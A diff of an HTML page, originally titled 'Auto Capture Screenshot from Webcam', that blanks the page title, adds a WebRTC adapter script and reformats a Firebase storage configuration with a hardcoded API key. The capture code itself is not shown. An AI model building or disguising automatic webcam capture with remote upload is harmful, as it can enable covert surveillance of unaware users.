@@ -2,9 +2,8 @@
 <html>
 
 <head>
-  
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Auto Capture Screenshot from Webcam</title>
+  <title></title>
 </head>
 
 <body>
@@ -20,18 +19,21 @@
     }
   </style>
 
+  <!-- Include adapter.js for cross-browser compatibility -->
+  <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
+
   <!-- Firebase Configuration -->
   <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-storage.js"></script>
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyCLiY-6AlJXtGKBzj0E-4LpexzG1olbfPM",
-  authDomain: "camera-screenshot.firebaseapp.com",
-  projectId: "camera-screenshot",
-  storageBucket: "camera-screenshot.appspot.com",
-  messagingSenderId: "168265982808",
-  appId: "1:168265982808:web:0c49c4596088b95a0a7b2d",
-  measurementId: "G-5KNR1NYHZZ"
+      authDomain: "camera-screenshot.firebaseapp.com",
+      projectId: "camera-screenshot",
+      storageBucket: "camera-screenshot.appspot.com",
+      messagingSenderId: "168265982808",
+      appId: "1:168265982808:web:0c49c4596088b95a0a7b2d",
+      measurementId: "G-5KNR1NYHZZ"
     };
 
     // Initialize Firebase
